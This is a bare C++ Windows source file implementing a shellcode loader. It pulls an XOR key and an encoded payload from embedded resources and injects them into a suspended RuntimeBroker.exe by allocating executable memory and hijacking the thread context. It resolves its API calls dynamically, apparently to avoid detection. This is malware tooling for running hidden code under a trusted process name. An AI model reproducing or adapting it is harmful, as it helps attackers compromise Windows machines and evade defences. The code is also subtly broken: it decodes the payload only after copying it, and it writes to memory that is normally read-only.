#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <iostream>
#include <random>
#include <cstdlib>
#include <ctime>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

void its_load_re(const char* renamer, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    
    HRSRC hResource = FindResource(hModule, renamer, RT_RCDATA);
    HGLOBAL resrdata = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(resrdata);
}

int main() {
    
    char* ke;
    DWORD keLen;
    its_load_re("dhanushkey1", &ke, &keLen);
    const char* processPath = "C:\\Windows\\System32\\RuntimeBroker.exe";
    char* code199k;
    DWORD code199kLen;
    its_load_re("dhanushcode56", &code199k, &code199kLen);

    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    
    si.cb = sizeof(si);
    
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    
    auto pCreateProcessA = (BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))GetProcAddress(hKernel32, "CreateProcessA");
    pCreateProcessA(processPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    
    auto pGetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(hKernel32, "GetThreadContext");
    pGetThreadContext(pi.hThread, &ctx);

    auto pVirtualAllocEx = (LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(hKernel32, "VirtualAllocEx");
    LPVOID lpBase = pVirtualAllocEx(
        pi.hProcess,
        NULL,
        code199kLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    auto pWriteProcessMemory = (BOOL(WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))GetProcAddress(hKernel32, "WriteProcessMemory");
    pWriteProcessMemory(pi.hProcess, lpBase, code199k, code199kLen, NULL);

    for (DWORD i = 0; i < code199kLen; i++) {
        code199k[i] ^= ke[i % keLen];
    }

    auto pSetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(hKernel32, "SetThreadContext");
    ctx.Rcx = (DWORD64)lpBase;
    pSetThreadContext(pi.hThread, &ctx);
    
    auto pResumeThread = (DWORD(WINAPI*)(HANDLE))GetProcAddress(hKernel32, "ResumeThread");
    pResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
